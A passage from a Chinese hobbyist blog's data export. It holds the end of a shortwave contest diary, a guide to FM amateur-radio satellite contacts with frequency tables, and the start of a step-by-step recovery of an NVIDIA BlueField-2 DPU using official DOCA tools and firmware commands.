10m，因为传播也很有规律，早上6点30左右太阳快出来的时候传播逐渐变强，中午远距离 DX 消失，到傍晚又渐强，直到深夜只有几个稀稀拉拉的信号。 多波段就不参与了，这样能保证有足够的时间休息，刚开始还是不要搞强度那么大，怕身体吃不消。后续证明我选择也对了，10m 传播爆了。 10月23日，通过 BG7JAF 的指导，用之前断掉的镀银馈线做了一个 1:1 的电流型巴伦，测试出来的指标很好。 买的馈线和 M 头也到了，可恶的卖家少发了一个 M 头，还好我还有一个，正好用上了。 在10月23号的时候，感觉买的铝型材到不了了，卖家还没发货，遂跟父亲说了这件事，让他带我去当地的建材市场去找找有没有卖的，俩人寻觅了2小时，无功而返。然后在网上买了另一家的型材。好在快递给力，在最后一天（10月25日）的下午，到货了，到家试着组装了一下，可行！ 比赛前夜仔细阅读了一下比赛规则，再次确认软件配置没问题。 和母亲联系好他同事，约定好第二天早上6点出发，自己则准备好要带的各种东西，担心那边没排插用，从家里找了一堆排插，甚至连 16A 的空调延长线也带上了，加了一个米家的空调伴侣 Pro，因为那上面有 10A 的插口，就这样带了一大袋的排插。 对这次比赛还特意准备了风绳，地钉是用之前做 GP 天线剩下的9.9元10根的管钉 + M10 的吊环螺母做的地钉，算是废物利用了，以下是比赛准备的东西列表。 主要 IC-7300 笔记本电脑 华为服务器电源 + 电源线 XT60 转 ICOM 口电源线 2 根 天线 20m EFHW 2el 拉杆 Yagi GP（Yagi 可变成 GP） 1:1 巴伦 3 个 1:49 巴伦 1 个 其他 手电钻 绳子 50m 地钉 4个 扎带 剪刀 一些备用的金属件 有没有发现少了什么，一个非常重要的东西，后文再做叙述。 比赛第一天前期准备6点出发，7点到达目的地的河边，等待开船来接我。 7 点 30 到达对岸，开始领域展开，发现手咪没带！赶紧联系母亲，在我的床脚下找到了手咪，问我怎么办，有没有其他办法，我说没办法。想过通过电脑的麦克风转到 ICOM 的声卡的音频输入进去，可行是可行，但是 PTT 控制有点灵车。母亲说搭摩托给我送过来，这可是有接近 10km 呢，真的感谢她。 之后呢，就忙着天线架设，按图纸的数据把拉杆扯到了指定的长度，但是谐振点不对，之后就对着天分调，最终调下来了。之后搞风绳的时候差点 QBG，应该先把支撑杆搞好再打风绳的，没拉过风绳经验不足吃亏了，还好天线没多重，稳住了。 一切准备好已经8点15分了，这时手咪也送到了，好感谢我的母亲，没有他这次比赛就泡汤了。 开干打开电台，频率上密密麻麻的信号，找了几个频率守听发现怎么听都别扭，记得之前看的文章有老师说过，有些台不喜欢用标准频率，会偏一点，点了一下频率的末尾的两个蛋，随后转波轮，这下声音才正常。 随之最困难的就出现了，我听不懂，是真的听不懂，报的字母解释法貌似是非标的，另外在 pileup 中主叫台主叫的时间也很少，让我听他们的呼号时间很少很少，通联的第一个台是 E20PFE，也算是破处了。随后就是听呼号，然后呼叫，刚开始速率是真的慢，因为一个呼号我要听 5 次以上才听的明白，尽管利用了 N1MM 的猜呼号功能，速率仍然提不上去。 在接触了 2 小时之后，经历了各种怀疑人生，渐渐 get 到了味道，能 2-3 遍听明白呼号，速率也提上来了。 通联的电台大部分都是亚洲和东南亚电台，在10点07分的时候通联到了第一个北美电台 ND7K，10点57分 KW7MM，11点54分 PX2A。此外都是亚洲和东南亚的台。 下午1点19分，第一个欧洲电台 OM2VL 出现！ 叫吃饭了，才取下耳机，发现耳鸣了。随便解决了午饭一下回到了电台前面继续干台，下午传播并不给力，都是 JA，并且速度也提不上去，起身活动了一下身子才发现腰酸背痛伴随着耳鸣头晕，有点想放弃比赛的感觉。 同时天线也转了一下，转到了 60 度，早上是 260 度。感觉 JA 信号强了很多。 稍微休息了一阵，把端馈天线架起来了，测试了一下接受效果并不理想，继续用八木干亚洲台。 后面没啥台干，随即下机，撸猫休息够了就继续扫地 太阳落山之后的时候欧洲传播开了，狠狠恰了一波系数分。 回过头看其实这段时间应该提速的，因为自己的弱抄收能力浪费了很多时间，那也没办法，毕竟第一次。 家人怕我冷，临时给我搭了个帐篷，晚上就睡在这里，还挺舒服的，有点享受这种感觉。晚上下了毛毛雨，看天气预报明天是阴天，感觉传播会变差。 在晚上的时候就在研究，看到他们有那个本地 bandmap 功能，刚开始以为这样做会违反规则，但是实际上是参加无辅助组的不能把自己的 spot 信息发出去，这个功能并不违反规则。唉，吃了没经验的亏啊。配置好了这个功能扫地还是很舒服的，给第二天的扫地上了大分。 传播到晚上 10 点差不多就结束了，仅有的几个 JA 和 HS 大台还有信号，一个最令我印象深刻的是 DY1O，在晚上大台基本上听不清的情况下，他信号过来 59+20 打雷一样。看了一下他的 QRZ 主页说的是 KILOWATTS ARE NEVER ENOUGH，哈哈，估计都是秃头佬（x 第一天以 82个 QSO 结束，之后就切换到端馈天线看了看其他波段的传播，试着 SSB 喊了一下不回我，小功率 + 低效率天线还是不行啊。后面无聊看看群，BD7PRC 传来捷报，说我的波段选对了，今天 10m 的传播非常好。晚上就挂挂 FT8，和几个老朋友成功在 40m 通联上了。 第二天晚上其实并没有多睡，晚上是挂着 10m 的 FT8 守听的，3点30分起来看了一下没传播，6点30分起来的时候看到一屏幕的 JA，甚至开了美国。 起床洗漱了一下，做了几个 QSO 之后就被叫去吃早餐了，下了一晚上的小雨，外面雾蒙蒙的，感觉今天要寄了。 开干已经是7点30分，没听到几个亚洲之外的信号，直到 9 点钟的时候才有亚洲以外的信号过来，还算比较强劲。 速率还是提不上去，一直在扫地，有了昨天配好的 bandmap 功能扫地扫的更快了，不过有几个台叫不通，拉扯几下就放弃我了，很难受。还有就是担心自己抄收呼号抄错了，有些呼号数据库里面没有，自己抄错了会扣分（但是到最后一个都没错）。 发现 JA 台听不懂我说的 seven，转而用日文的 なな(nana) 解释，Bravo Hotel number seven, number nana。很有用，解决了很多个听不懂我的英文念法的日本台。 回过头来看这张图，扣掉昨天已经通过的台，速率其实提高了很多。 就这样一直扫地扫地，期间累了利用 7300 的录音功能进行摆摊。找一个空闲频率问了几句有没有人用这个频率，没人回就开始摆摊，平均摆摊 20 分钟上钩一个吧，感觉不如去扫地。 就这样一直在干 DU, JA, YB, VU, 直到下午 3 点父亲来了，叫我回家，我一看一个小时才通了 5 个台，频率上都是干过的大台了，遂跟着回家，准备第二天早上再来。 第三天依旧夜间 FT8 挂机，看到开美国了有点激动~ 6点50分到位，依旧是 DU, YB, JA 等等离得近的台，开始疯狂扫地，最后在7点58分的时候和 JR3NZC 完成最后一个 QSO。 得分 18038，160个 QSO，终于结束~ 收尾下面是一些收尾工作的照片 10m 天线这样看的话，体积也是有蛮大的，另外有一根阵子弯折的比较厉害，新买的那根不太行，不知道影响大不大。 巴伦盒子的螺丝经过雨水一天的洗礼就生锈了，后面全换 304 螺丝了。 从上往下看 端馈巴伦螺丝也没有幸免。 拆下来的地钉。 狗窝~ 总结和展望其实在比赛还没结束的时候，就有其他的友台发自己的分数了，通过比较发现自己做的 QSO 数太少了，回过头来想了想，我能听见的台 90% 我都通联上了，QSO 数量这么少只有两种可能。传播不好 or 环境因素，看了一下周围，我这属于是山脚下，没有高度，可能这就是最大的原因吧。 其实最开始比赛是想去客席别人的台和设备，但是想了想算了。这次比赛我尽自己最大的努力，并且也没有出现关键性的错误，比赛顺利完结，一切都顺利，这就是最好的结果了。 Raw Score 出来了， BY #4，AS #37。成绩断层很大，和上一名差距有点吓人了。 同时我的 SSB DXCC 也不是个位数了，另外还多了 4 个 SSB 独有的 DXCC。 下一步的计划是学习 CW，做一个 4 单元的便携快拆八木、入坑猪网天线和学习天线设计。我玩业余无线电的目的不仅仅是通联这件事本身，而是折腾的乐趣。 感谢看到这里的各位，也同样感谢前辈们的经验分享，没有你们的支持我走不到今天这一步，希望有一天能和你们在空中相遇，也同样祝愿大家能通到更多更远的电台~","categories":[{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/categories/%E6%97%A0%E7%BA%BF%E7%94%B5/"}],"tags":[{"name":"短波","slug":"短波","permalink":"https://blog.irec.moe/tags/%E7%9F%AD%E6%B3%A2/"},{"name":"比赛","slug":"比赛","permalink":"https://blog.irec.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"如何正确的优雅的完成 FM 卫星通联","slug":"无线电/如何正确的优雅的完成FM卫星通联","date":"2024-09-09T04:00:00.000Z","updated":"2025-09-20T11:40:54.138Z","comments":true,"path":"/qsoviasat.html","permalink":"https://blog.irec.moe/qsoviasat.html","excerpt":"","text":"近期在打 ISS 的时候发现挺多的友台入坑了，晚间的 ISS 非常热闹。作为一个入坑 FM 卫星通联 6 个月的无线电爱好者，掌握了一定的通联技巧，所以在此分享一下我的经验。 前期准备硬件部分你需要有一台上了证的电台、一根八木天线，其实其他类型的天线也能上，但是我建议积累一定经验之后再来操作比较好。 八木天线推荐 JYR 的 U7V4，双极化对于 SO-50 这种卫星很舒服，我的建议是一步到位，虽然天线的价格可以买3个 K6 了，曾经我也是从 U5V3 换过来的，打 SO-50 手拧成麻花了。 需要一根两头都是M公的馈线，长度 1m - 0.5m 就够了，一个 SMA 母头转 M 母的的转接头。 为啥不直接用 SMA 到 M 头的馈线？别问，问就是馈线会 QBG。 辅助设备需要有一个手机支架，我用的是闪魔的骑行支架，可以直接夹在主梁上，他的设计拆装很方便。 天馈部分所有用到的购买链接都在这里 名称 SKU 购买链接 馈线 M公头-M公头 1m https://item.taobao.com/item.htm?id=628307067506 天线 JYR U7V4 https://item.taobao.com/item.htm?id=6365910487 转接头 SMA母转M母 https://item.taobao.com/item.htm?id=616640602871 手机支架 车把款 https://item.taobao.com/item.htm?id=787258619047 软件部分对于 FM 卫星通联，会受到一个叫多普勒效应的影响，这使得接受和发射的频率并不是固定的，所以我们一般会设置 5 个频率，并存储到信道中。这是在 HamCQ 论坛中分享的频率表，找到想要上的卫星然后写入到电台中的信道中，并做好区域划分，在此不做过多叙述。 对于卫星通联，还有一个问题是：如何知道卫星什么时候过境，什么时候出境？卫星什么时候开机？ 卫星出入境Look4Sat 可以帮你解决这个问题，他是一款开源免费的 Android 端追星软件，界面非常简洁直观。 初次使用只需要去设置里面更新 GPS 和 转发器数据，再添加想要的卫星，就能到主界面看到了。在打卫星的时候软件的具体操作后续有演示。 卫星状况卫星的状态可以在这个网站上查看到：https://www.amsat.org/status/ 这是爱好者自行反馈的状态。 PO-101 和 UVSQ 卫星的 FM 转发器的开机时刻是在 X 上有发推文，ISS 的维护时刻表在 AMSAT 网站上有。 前期准备部分就结束了，接下来就是最重要的部分，也是我最想告诉大家的。 如何提高 QSO 效率卫星的选择卫星的选择是非常重要的，我们目前常用的 FM 卫星有 ISS, SO-50, AO-91 和 PO-101。 ISS 最近挤成菜市场了，还被各种高功率压制，很难完成 QSO。但是你可以在晚上3点到早上9点的时候去上，因为没人，就算你用原装天线也能上的去。 SO-50 因为转发器体质不佳，转发质量越来越差，而且有频偏。不过最近又好起来了，他只有0.25W的功率，但声音质量也很棒。 AO-91 好像是电池坏了，只在白天能用，并且转发器也有问题，断续很严重。 相比之下 PO-101 则很棒了，唯一的缺点是需要等开机时间，并且上去的难度也挺高的，对天线和环境有一定的要求，PO-101 是我挺喜欢上的一颗卫星，QSO 效率很高，而且也不挤。 还有一颗 SO-121，开机随缘，声音说实话还可以，很有意思，可以约别人一起去玩。 其实只要选对卫星，你通联的效率就会成倍的提升，并且可以直接避免被人压制导致空军，然后一肚子气提控回家。 所以总的来说，我的建议就是挑阴间时间上 ISS 和 SO-50，PO-101 看开机时间去上。 如何正确完成卫星通联秩序对于这个，我唯一强调的是通联的秩序，相信你肯定不想在和别人 QSO 的过程中被人一句 CQ Satellite 打断吧。 对于正在通联的双方来说，可能某一方回复另一方的时候被压制了，导致 QSO 终端。然后另一方又开始回复对方，可能这个时候有其他友台回复你了，然后你压的那方又继续在和那一方在通联，把你也压了。这就是一个死循环了，最后谁也没完成 QSO。 你们别吵啦，一个一个来 正确方法最重要的是先守听，等待听到有下行信号（载波&#x2F;话音）时，在别人 QSO 结束的结尾，找到间隙主动呼叫对方。 以下是示例： BG7QIW: Bravo Hotel Seven Foxtrot Bravo Papa, Bravo Golf Seven Quebec India Whiskey five nine BH7FBP: Bravo Golf Seven Quebec India Whiskey, Bravo Hotel Seven Foxtrot Bravo Papa U ALSO five nine seventeen three~ BG7QIW: seventeen three! 这时你可以插入，主动呼叫 BG7QIW 或者 BH7FBP，因为他俩上下行都很不错，呼叫他俩 QSO 的成功率对于你自己来说会很高。如果你主动 CQ 的话，这样就耽搁了一个时隙，别人需要呼叫你，你再回复。这样相较于主动呼叫别人时间耗费更多，降低了效率。 例如： BH7FBP: Bravo Golf Seven Quebec India Whiskey, Bravo Hotel Seven Foxtrot Bravo Papa, U ALSO five nine seventeen three~ BG7QIW: seventeen three! BI7BMB: Bravo Golf Seven Quebec India Whiskey, Bravo India Seven Bravo Mike Bravo five by nine BG7QIW: Bravo %$#Buzzzzz%$# Bravo %$#Buzzzzz%$# Seven Quebec %$#Buzzzzz%$# 欸，怎么没抄完整，我应不应该回复他。没问题！大胆回复他，就算没抄完整，只要你有90%的把握他在呼叫你，直接回复。这时应该回复什么呢。 BI7BMB: QSL Seventeen Three! &#x2F; 抄收了 73 再见 关于呼叫大家在卫星上呼叫的用语有挺多种的，我目前用的是呼号 + 网格。这是在 AMSAT 网站 上关于 FM 卫星通联推荐的做法。关于这个也挺有争议的，我的意见是：不论你说什么，能简短迅速的让别人知道的呼号，就够了。 什么时候可以主动呼叫呢，只有当你有十足的把握卫星当前是空闲没人在通联的状态，并且你的上行能上去，或你有全双工的设备，实时能返听到你的话音的情况下，那可以随意呼叫。 我一般是某趟卫星在阴间时间，并且在仰角（5°-10°）发现没有下行，然后掐 PTT 发现有回波的时候，我会这样做。 但是热门时段就千万别这样做了，可能你没有下行信号的时候，你上行信号上去了把别人压制了，然后就是之前我说的惨状，这现象在 SO-50 上非常常见，聋子很多。 回波：指掐 PTT 之后能听到有空音频的载波信号下来，同时场强表有明显的上升，随后变成沙沙声，那段空音频就是回波。在卫星通联中只有 ISS 比较明显。受限于电台型号的不同，某些电台型号效果不明显，或者开了尾音消除。建议新手不要这样做，耐心等待有下行即可。 通联示范接下来就是我通联的示范了，我用的是 8600 + U7V4。 【业余无线电】如何优雅的完成 FM 卫星通联 FAQ通联的时候抄不清对方呼号怎么办？多听，多练，这是一个熟能生巧的过程，不可能一天之内变得很熟练。 我的技巧是每次打卫星都把手机的录音打开，当别人在呼叫你，而你吵不清别人呼号的时候或脑子反应不过来（我也是这样），直接鹦鹉学舌，他怎么样说过来的，你把他说的那段话带着你的呼号回给他，当这趟卫星打完了之后，再慢慢听录音，只要确保对方把你的呼号抄正确了就行。 还有一个技巧就是挑没人的时候去上卫星，就算抄不清，你可以要求别人重复过来一遍，一般大家都会耐心的等你俩通联完再来通联。 BI7BMB: Bravo Golf Question? &#x2F; Please Again &#x2F; 再来一下好吗 BG7QIW: Bravo Golf Seven Quebec India Whiskey Queen Italian Whisky BG7QIW BI7BMB: BG7QIW BI7BMB 59 73 BG7QIW: 73 就像这样，这个时间段不会有人来压制 &#x2F; 插入你们俩之间。而是慢慢的等你们通联完，再来呼叫。然后你可能会被轰炸，叫你让你回到嘴巴冒烟，因为你是新台，23333。 别人反馈我的话音质量很差 &#x2F; 我收到的下行很差首先检查的应该是天线情况，有可能你的八木的引向器装反了，或者是装错位置了，有条件的直接上驻波表测试。还有一个原因是你的手机指南针不准，对歪了。这个时候你可以靠感觉来调整，找到一个下行比较好的位置，同时观察手机屏幕角度的变化随之调整你手举着的天线的方位角和仰角。 手机指南针失灵是很正常的，我打卫星几乎有一半的概率指南针会飘。不过自己玩得多了，靠感觉盲指也没问题，这也是一个熟练度的问题。 2024.09.09 BH7FBP 审稿：BG7QIW BG7XWF 其他资源卫星开机状态查询：https://www.amsat.org/status/ 🛰 FM 卫星大全&#x3D;这下面的所有卫星都不需要设置接收亚音，保持为空即可，发射亚音为空的话意思就是不需要设置，亚音类型为 CTCSS，不要设置成 DCS。 K5-Web 上可以下载到我制作的频率表。 这里只包含我玩过的卫星，可用的卫星远远不止于此，还有线性星的世界等待你探索呢。 国际空间站 (ISS)介绍：功率大，热门时段很多人，小功率容易被压制，建议闲时玩。 但是 APRS 人少，推荐威诺机器玩，路径设置成 ARISS,SGATE,WIDE2-1 信道名称 接收频率 (MHz) 发送频率 (MHz) 发送亚音频 (Hz) ISS-AOS1 437.8100 145.9875 67.0 ISS-AOS2 437.8050 145.9875 67.0 ISS-FM 437.8000 145.9900 67.0 ISS-LOS1 437.7950 145.9925 67.0 ISS-LOS2 437.7900 145.9925 67.0 ISS APRS AOS 145.8225 145.8275 ISS APRS 145.8250 145.8250 ISS APRS LOS 145.8275 145.8225 SO-50 (SaudiSat 1C)传奇沙特科技，他可能比你的年龄都大。 通讯质量看运气，卫星天线受极化效应影响很大，通联时需要转天线。 信道名称 接收频率 (MHz) 发送频率 (MHz) 发送亚音频 (Hz) SO-50 OP1 436.8050 145.8475 74.0 SO-50 AOS1 436.8050 145.8475 67.0 SO-50 AOS2 436.8000 145.8475 67.0 SO-50 OP2 436.7950 145.8500 74.0 SO-50 FM 436.7950 145.8500 67.0 SO-50 LOS1 436.7900 145.8525 67.0 SO-50 LOS2 436.7850 145.8525 67.0 PO-101 (DIWATA-2B)抹布嗨科技，已经快不行了，开机时间很随缘。 V 段下行，对环境要求高。 信道名称 接收频率 (MHz) 发送频率 (MHz) 发送亚音频 (Hz) PO-101 AOS1 145.9025 437.4900 141.3 PO-101 AOS2 145.9025 437.4950 141.3 PO-101 FM 145.9000 437.5000 141.3 PO-101 LOS1 145.8975 437.5050 141.3 PO-101 LOS2 145.8975 437.5100 141.3 AO-91 (Fox-1B)功率小，同时因为是 V 段下行，城市干扰严重很难上，考验机器的接收灵敏度。 信道名称 接收频率 (MHz) 发送频率 (MHz) 发送亚音频 (Hz) AO-91 AOS1 145.9625 435.2400 67.0 AO-91 AOS2 145.9625 435.2450 67.0 AO-91 FM 145.9600 435.2500 67.0 AO-91 LOS1 145.9575 435.2550 67.0 AO-91 LOS2 145.9575 435.2600 67.0 ASRTU一般周末或者节假日开机，通信质量不错，需要连贯着通联才不会被遥测打断（别人在话说完的前 0.5s 你按 PTT 接上） 信道名称 接收频率 (MHz) 发送频率 (MHz) 发送亚音频 (Hz) ASRTU AOS1 435.4100 145.8475 67.0 ASRTU AOS2 435.4050 145.8475 67.0 ASRTU FM 435.4000 145.8500 67.0 ASRTU LOS1 435.3950 145.8525 67.0 ASRTU LOS2 435.3900 145.8525 67.0 SO-124 &amp; SO-125卫星灵敏度挺好，但是有遥测打断，可能一次过境，有一半的时间都是遥测。 无亚音，会有工地和船台干扰。 信道名称 接收频率 (MHz) 发送频率 (MHz) 发送亚音频 (Hz) SO-124 AOS1 436.8980 145.9225 SO-124 AOS2 436.8930 145.9225 SO-124 FM 436.8880 145.9250 SO-124 LOS1 436.8830 145.9275 SO-124 LOS2 436.8780 145.9275 SO-125 AOS1 436.8980 145.9225 SO-125 AOS2 436.8930 145.9225 SO-125 FM 436.8880 145.9250 SO-125 LOS1 436.8830 145.9275 SO-125 LOS2 436.8780 145.9275 Tevel 2 代目传奇小火车🚆又复活啦，无亚音容易被工地干扰。 信道名称 接收频率 (MHz) 发送频率 (MHz) 发送亚音频 (Hz) Tevel AOS1 436.4100 145.9675 Tevel AOS2 436.4050 145.9675 Tevel FM 436.4000 145.9700 Tevel LOS1 436.3950 145.9725 Tevel LOS2 436.3900 145.9725 IO-86在赤道30°以内可用，我曾经在海陵岛听到过他们的通联，在阳江阳西县的月亮湾景区成功使用他通联过： 【业余无线电】IO-86 卫星通联实录 【业余无线电】使用 IO-86 卫星通联成功 Part 4: VR HT-Only on IO-86 on 9 Feb 2025 starting 01:27 UTC 信道名称 接收频率 (MHz) 发送频率 (MHz) 发送亚音频 (Hz) Tevel AOS1 435.8900 145.8775 88.5 Tevel AOS2 435.8850 145.8775 88.5 Tevel FM 435.8800 145.8800 88.5 Tevel LOS1 435.8750 145.8825 88.5 Tevel LOS2 435.8700 145.8825 88.5 卫星是按表开机的，APRS 可用且挺容易上的 .gidvdnuskcxj{zoom:50%;} SONATE-2 NO-44这俩是 APRS 卫星 SONATE-2 需要设置路径为 DP0SNX NO-44 需要设置路径为 W3ADO-1 挺吃设备和环境，我都上去过，挺难的。","categories":[{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/categories/%E6%97%A0%E7%BA%BF%E7%94%B5/"}],"tags":[{"name":"卫星","slug":"卫星","permalink":"https://blog.irec.moe/tags/%E5%8D%AB%E6%98%9F/"}]},{"title":"NVIDIA BlueField-2 DPU 配置为 NIC 网卡的折腾过程","slug":"硬件/20240716_NVIDIA BlueField-2 DPU 配置为 NIC 网卡的折腾过程/BlueField-2 DPU ES","date":"2024-07-16T04:00:00.000Z","updated":"2024-08-15T06:20:07.000Z","comments":true,"path":"/nvidia_boyfriend.html","permalink":"https://blog.irec.moe/nvidia_boyfriend.html","excerpt":"","text":"前情提要朋友搞来一块 NVIDIA BlueField-2 给我来玩玩，据说是他进 DPU 里面的 ARM 系统里面执行了一下更新命令，然后电脑设备管理器就感叹号了，里面的 ARM 跑着的系统也挂了。具体的情况他也不清楚，反正就到我手上了。 让他发了一块好的和一块坏的，两张都收到了，还带了一个 VMWare的 Edge 310 给我来研究。 实物情况第一块图片是后补的，不要介意。 背面标签Model No：BF2M345A P&#x2F;N: MBF2M345A-VENOT_ES S&#x2F;N: MT219X37294 开机非常慢，设备管理器有一个模块报错误10 使用和主机通讯的串口，不知道账户和密码，只能重置了。 启动信息1234567891011121314151617Mellanox BlueField-2 A1 BL1 V1.1 NOTICE: BL2R: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL2R: Built : 18:59:31, Jul 22 2021 NOTICE: BL2R built for hw (ver 1) NOTICE: No CDI given, can&#39;t complete Riot operation NOTICE: BL2R: Booting BL2 NOTICE: BL2: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL2: Built : 18:59:30, Jul 22 2021 NOTICE: BL2 built for hw (ver 1) NOTICE: Running as MBF2M345A-VENOT_ system NOTICE: No SPD detected on MSS0 DIMM0 NOTICE: No SPD detected on MSS0 DIMM1 NOTICE: Finished initializing DDR NOTICE: DDR POST passed. NOTICE: BL31: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL31: Built : 18:59:31, Jul 22 2021 NOTICE: BL31 built for hw (ver 1) 固件版本123456789101112131415161718192021C:\\Program Files\\Mellanox\\WinMFT&gt;mlxfwmanager.exe Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.31.0356 N/A PXE 3.6.0401 N/A UEFI 14.24.0013 N/A UEFI Virtio blk 22.1.0011 N/A UEFI Virtio net 21.1.0011 N/A Status: No matching image found 第二块启动信息1234567891011121314151617Mellanox BlueField-2 A1 BL1 V1.1 NOTICE: BL2R: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL2R: Built : 18:59:31, Jul 22 2021 NOTICE: BL2R built for hw (ver 1) NOTICE: No CDI given, can&#39;t complete Riot operation NOTICE: BL2R: Booting BL2 NOTICE: BL2: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL2: Built : 18:59:30, Jul 22 2021 NOTICE: BL2 built for hw (ver 1) NOTICE: Running as MBF2M345A-VENOT_ system NOTICE: No SPD detected on MSS0 DIMM0 NOTICE: No SPD detected on MSS0 DIMM1 NOTICE: Finished initializing DDR NOTICE: DDR POST passed. NOTICE: BL31: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL31: Built : 18:59:31, Jul 22 2021 NOTICE: BL31 built for hw (ver 1) 固件版本123456789101112131415161718Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: mt41686_pciconf0 Base GUID: b8cef60300fc5446 Base MAC: b8cef6fc5446 Versions: Current Available FW 24.31.0356 N/A PXE 3.6.0401 N/A UEFI 14.24.0013 N/A UEFI Virtio blk 22.1.0011 N/A UEFI Virtio net 21.1.0011 N/A Status: No matching image found 资源所有的资源都是来自 NVIDIA 官网 文档DOCA 文档https://docs.nvidia.com/networking/dpu-doca/index.html#doca 1.5.1 LTS 文档https://docs.nvidia.com/doca/archive/doca-v1.5.1/index.html NVIDIA DOCA Installation Guide for Linux DOCAhttps://developer.nvidia.com/doca-downloads 这里 下载 DOCA 历史版本 网卡固件https://linux.mellanox.com/public/repo/ 具体步骤物主要求把卡弄好，当成正常的 CX6 网卡使用，参考了下面两个教程和官网的文档。 https://www.bilibili.com/video/BV1Cm421s7sq https://www.bilibili.com/read/cv32771337 1、安装 Ubuntu这个就不用说了吧。 2、安装 DOCA 环境直接装最新版的就行，不需要特意装1.5.1版本的。 1234wget https://www.mellanox.com/downloads/DOCA/DOCA_v2.7.0/host/doca-host_2.7.0-209000-24.04-ubuntu2204_amd64.deb sudo dpkg -i doca-host_2.7.0-209000-24.04-ubuntu2204_amd64.deb sudo apt-get update sudo apt-get -y install doca-all 如果碰到卡在 building initial module ，请关闭主板的 Secure Boot 功能。 3、启动 rshim1sudo systemctl start rshim 4、使用 minicom 连接 DPU如果没装过的话记得 sudo apt get install minicom 一下。 1sudo minicom -D /dev/rshim0/console 5、重置 DPU 的 ARM 核1sudo echo &quot;SW_RESET 1&quot; &gt; /dev/rshim0/misc 6、向 DPU 更新 DOCA 1.5.1-LTS 版本首先必须得更新到这个版本，再更新网卡驱动，直接更新最新的 DOCA 版本的话系统会起不来，如图所示。 1bfb-install --rshim rshim0 --bfb DOCA_1.5.1_BSP_3.9.3_Ubuntu_20.04-4.2211-LTS.signed.bfb 7、启动成功，修改默认账户和密码123456789101112131415161718Mellanox BlueField-2 A1 BL1 V1.1 NOTICE: No CDI passed to Riot core! NOTICE: BL2R: v2.2(release):3.9.3-4-g43fe858 NOTICE: BL2R: Built : 19:38:23, Oct 21 2022 NOTICE: BL2R built for hw (ver 1) NOTICE: BL2R: Booting BL2 NOTICE: BL2: v2.2(release):3.9.3-4-g43fe858 NOTICE: BL2: Built : 19:38:22, Oct 21 2022 NOTICE: BL2 built for hw (ver 1) NOTICE: Running as MBF2M345A-VENOT_ system NOTICE: No SPD detected on MSS0 DIMM0 NOTICE: No SPD detected on MSS0 DIMM1 NOTICE: Finished initializing DDR NOTICE: DDR POST passed. NOTICE: BL31: v2.2(release):3.9.3-4-g43fe858 NOTICE: BL31: Built : 19:38:22, Oct 21 2022 NOTICE: BL31 built for hw (ver 1) UEFI firmware (version BlueField:3.9.3-7-g8f2d8ca built at 19:40:49 on Oct 21 2022) ubuntu ubuntu ubuntu Bf112233 8、备份网卡固件在宿主机上执行 123456789101112sudo mst status MST modules: ------------ MST PCI module is not loaded MST PCI configuration module loaded MST devices: ------------ /dev/mst/mt41686_pciconf0 - PCI configuration cycles access. domain:bus:dev.fn=0000:06:00.0 addr.reg=88 data.reg=92 cr_bar.gw_offset=-1 Chip revision is: 01 备份固件命令，这里请根据具体的PCI地址来修改。 123456flint -d 06:00.0 query full &gt; flint_query.txt flint -d 06:00.0 hw query &gt; flint_hwinfo.txt flint -d 06:00.0 ri orig_firmware.mlx flint -d 06:00.0 dc orig_firmware.ini flint -d 06:00.0 rrom orig_rom.mlx mlxburn -d 06:00.0 -vpd &gt; orig_vpd.txt 9、启动 mst 服务，查询网卡版本123456789101112131415161718192021222324252627282930313233343536373839404142434445// 启动 mst 服务 sudo mst start Starting MST (Mellanox Software Tools) driver set Loading MST PCI module - Success [warn] mst_pciconf is already loaded, skipping Create devices Unloading MST PCI module (unused) - Success // 查看 mst 状态 sudo mst status MST modules: ------------ MST PCI module is not loaded MST PCI configuration module loaded MST devices: ------------ /dev/mst/mt41686_pciconf0 - PCI configuration cycles access. domain:bus:dev.fn=0000:03:00.0 addr.reg=88 data.reg=92 cr_bar.gw_1 Chip revision is: 01 // 查询网卡版本信息 sudo mlxfwmanager Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gent PSID: MT_0000000809 PCI Device Name: /dev/mst/mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.31.0356 N/A PXE 3.6.0401 N/A UEFI 14.24.0013 N/A UEFI Virtio blk 22.1.0011 N/A UEFI Virtio net 21.1.0011 N/A Status: No matching image found 10、更新网卡固件到 24.35 版本这个固件是包含在 DOCA 1.5.1 内的，据作者在评论区所说这是最后一个包含这个网卡 PSID 的最后一个版本系统。所以先刷 DOCA 1.5.1，再升级到 DOCA 2.7，再升级最新的网卡固件。能不能跳过这个步骤直接升级最新的网卡固件我不知道，我也不愿意试试，毕竟不便宜。 12345678910111213141516171819202122232425262728293031// 更新固件 sudo /opt/mellanox/mlnx-fw-updater/firmware/mlxfwmanager_sriov_dis_aarch64_41686 Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: 